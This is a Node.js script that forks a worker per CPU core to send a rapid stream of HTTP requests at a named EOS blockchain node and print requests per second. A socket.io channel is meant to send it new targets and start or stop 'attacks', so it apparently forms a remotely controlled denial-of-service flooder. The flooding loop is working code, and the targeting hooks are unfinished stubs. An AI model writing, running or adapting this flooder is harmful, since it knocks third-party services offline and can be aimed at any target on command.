const io = require('socket.io-client');
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;
const request = require('request');

if (cluster.isMaster) {

    console.log(`Master ${process.pid} is running`);
    const socket = io.connect('http://localhost');
    socket.on('new_target', function (data) {
        // TODO: Configure and fire agaist a new target
        console.log(data);
    });

    socket.on('stop', () => {
        // TODO: Stop current attacks
    });

    socket.on('start', () => {
        // TODO: Resume current attacks
    });

    // Fork workers.
    console.log('Available Cores: ' + numCPUs);
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        // console.log(`worker ${worker.process.pid} died`);
    });

    let errCounter = 0;
    let totalRequests = 0;
    let totalErrors = 0;

    for (const id in cluster.workers) {
        cluster.workers[id].on('message', (msg) => {
            if (msg.cmd === 'report') {
                // console.log(msg.data.tcp);
                reqCounter++;
            }
            if (msg.cmd === 'err') {
                // console.log(msg.data.tcp);
                errCounter++;
            }
        });
    }
    let intervalId = null;
    intervalId = setInterval(() => {
        if (reqCounter === 0 && totalRequests > 0) {
            clearInterval(intervalId);
            console.log('Finished!');
        } else {
            console.log(reqCounter + ' req/sec | ' + errCounter + ' err/sec');
            totalErrors += errCounter;
            totalRequests += reqCounter;
            reqCounter = 0;
            errCounter = 0;
        }
    }, 1000);

} else {
    // console.log(`Worker ${process.pid} started`);

    for (let i = 0; i < 10; i++) {
        timedRequest();
    }
}

let reqCounter = 0;

function resetCounter() {
    reqCounter = 0;
}

function timedRequest() {
    const request_options = {
        uri: 'http://nlb.hkeos.com:8886/v1/chain/get_info',
        json: false,
        method: "GET",
        // localAddress: '',
        timeout: 5000,
        time: true
    };
    request(request_options, (err, response) => {
        if (err) {
            // console.log(err);
            process.send({
                cmd: 'err'
            });
        } else {
            process.send({
                cmd: 'report'
            });
        }
        reqCounter++;
        if (reqCounter < 10000) {
            timedRequest();
        } else {
            process.send({
                cmd: 'end',
                data: reqCounter
            });
            //resetCounter();
        }
    });
}